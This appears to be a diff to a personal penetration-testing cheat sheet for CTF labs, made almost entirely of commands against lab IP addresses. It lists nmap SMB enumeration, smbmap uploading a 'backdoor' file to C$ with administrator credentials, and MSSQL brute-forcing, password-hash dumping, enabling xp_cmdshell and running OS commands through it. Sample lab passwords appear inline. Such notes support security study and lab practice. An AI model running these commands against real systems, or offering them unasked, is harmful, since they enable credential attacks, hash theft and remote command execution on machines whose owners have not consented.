@@ -2,6 +2,8 @@ nmap -sC -sV -oA nmap/ctf 10.4.25.246
 nmap -Pn 10.0.30.43  #icmp desabled servers port scan)
 nmap -Pn -sV -p 10.0.30.43 # scan port 80 information
 nmap 10.0.1.2/20 --open #scan open port
+
+###nmap SMB###
 nmap -p445 --script smb-protocols 10.0.17.200 #SMB port scan command
 nmap -p445 --script smb-security-mode 10.0.17.200 #check the security mode
 nmap -p445 --script smb-enum-sessions 10.0.17.200 #enumulate the sesstion
@@ -9,7 +11,6 @@ nmap -p445 --script smb-enum-shares 10.0.17.200 #Enumerating all available share
 nmap -p445 --script smb-enum-users --script-args smbusername=administrator,smbpassword=smbserver_771 10.0.17.200 #Enumerate the windows users on a target machine.
 nmap -p445 --script smb-server-stats --script-args 
 nmap -p445 --script smb-enum-domains --script-args #Enumerating available domains on a target machine.
-
 
 SMB
 smbmap -u guest -p "" -d . -H 10.0.28.123 #Running smbmap tool to discover all shared folders and drives.We will find all the shared folders using a guest user account.
@@ -19,6 +20,33 @@ smbmap -H 10.0.28.123 -u Administrator -p 'smbserver_771' -L #Listing all drives
 smbmap -H 10.0.28.123 -u Administrator -p 'smbserver_771' --upload '/root/backdoor' 'C$\backdoor' # Uploading a sample file touch backdoor'C$\backdoor
 smbmap -H 10.0.28.123 -u Administrator -p 'smbserver_771' -r 'C$' #brows directory 
 smbmap -H 10.0.28.123 -u Administrator -p 'smbserver_771' --download 'C$\flag.txt #Download the flag.txt file.
+
+###nmap SQL##
+nmap --script ms-sql-info -p 1433 10.0.30.33
+nmap -p 1433 --script ms-sql-ntlm-info --script-args mssql.instance-port=1433 10.0.30.33 #discover MSSQL server information.
+nmap -p 1433 --script ms-sql-brute --script-args userdb=/root/Desktop/wordlist/common_users.txt,passdb=/root/Desktop/wordlist/100-common-passwords.txt 10.0.30.33 #dentifying valid MSSQL users
+nmap -p 1433 --script ms-sql-empty-password 10.0.30.33 #check if sa user is enabled without any password.
+nmap -p 1433 --script ms-sql-query --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-query.query="SELECT * FROM master..syslogins" 10.0.30.33 -oN output.txt gvim output.txt
+nmap -p 1433 --script ms-sql-dump-hashes --script-args mssql.username=admin,mssql.password=anamaria 10.0.30.33 #Dump the hashes of MSSQL users
+nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-xp-cmdshell.cmd="ipconfig" 10.0.30.33
+nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-xp-cmdshell.cmd="type c:\flag.txt" 10.0.30.33
+
+python3 -m mssqlcli.main -S 10.0.16.26 -U sa -P sweetness #connect database
+select @@version; #Checking the version
+select host_name(); ##Discover the target machine hostname.
+select loginname from syslogins where sysadmin = 1;  # Determine users with sysadmin rights
+select name from sys.databases; #: Discover all the present databases.
+select * from sysusers; #Discover all MSSQL valid users.
+select name, password_hash FROM master.sys.sql_logins #Discover all the MSSQL users hashes
+SELECT name, CONVERT(INT, ISNULL(value, value_in_use)) AS IsConfigured FROM sys.configurations WHERE name = 'xp_cmdshell'; #Identify that the xp_cmdshell is enabled or not.
+EXEC sp_configure 'show advanced options', 1;RECONFIGURE;exec SP_CONFIGURE 'xp_cmdshell', 1;RECONFIGURE ##Enable xp_cmdshell
+EXEC xp_cmdshell "whoami" # Checking current running users.
+EXEC xp_cmdshell "echo %cd%"  #Checking current path
+EXEC xp_cmdshell "dir C:\"  ##read directory
+EXEC xp_cmdshell "type C:\flag.txt" ##read file
+
+
+
 
 
 windows mount and umount 
